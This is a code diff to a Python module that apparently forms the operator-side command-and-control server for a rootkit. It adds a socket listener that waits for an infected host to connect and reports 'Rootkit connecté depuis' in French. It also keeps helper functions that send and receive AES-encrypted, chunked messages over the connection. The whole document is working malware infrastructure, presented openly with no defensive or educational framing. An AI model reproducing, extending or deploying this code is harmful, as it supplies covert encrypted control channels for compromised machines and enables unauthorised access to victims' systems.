@@ -1,13 +1,35 @@
+from utils.aes import aes_encrypt, aes_decrypt
+import config as cfg
 import socket
-from config import BUFFER_SIZE
-from encryption import aes_encrypt, aes_decrypt
+
+# ------------------------------ SOCKET THREAD ------------------------------ #
+
+def socket_listener():
+    global rootkit_connection, rootkit_address
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_socket.bind((cfg.HOST, cfg.PORT))
+    server_socket.listen(1)
+    print(f"📡 [*] Serveur à l'écoute sur {cfg.HOST}:{cfg.PORT}...")
+    connection, address = server_socket.accept()
+
+    with cfg.connection_lock:
+        rootkit_connection = connection
+        rootkit_address = address
+
+    print(f"✅ [+] Rootkit connecté depuis {address[0]}")
+
+    data = receive_from_server(connection)
+    print(f"📥 [rootkit] {data}")
+
+# --------------------------- SOCKET COMMUNICATION --------------------------- #
 
 def send_to_server(sock, data):
     # Encrypt the data
     data = aes_encrypt(data)
 
     # Define the maximum chunk size
-    max_chunk_body_size = BUFFER_SIZE - 5
+    max_chunk_body_size = cfg.BUFFER_SIZE - 5
     len_data = len(data)
 
     # Calculate the number of chunks needed
@@ -22,7 +44,7 @@ def send_to_server(sock, data):
             current_chunk_size = max_chunk_body_size  # Last chunk of maximum size
 
         # Build the chunk
-        chunk = bytearray(BUFFER_SIZE)
+        chunk = bytearray(cfg.BUFFER_SIZE)
         chunk[0] = nb_chunks_needed  # Number of chunks
         chunk[1] = i  # Index of the current chunk
         chunk[2] = (current_chunk_size >> 8) & 0xFF  # Upper byte of the chunk size
@@ -47,7 +69,7 @@ def receive_from_server(sock):
 
     while True:
         # Receive a chunk
-        chunk = sock.recv(BUFFER_SIZE)
+        chunk = sock.recv(cfg.BUFFER_SIZE)
         if not chunk:
             print("receive_from_server: failed to receive data or connection closed")
             return False
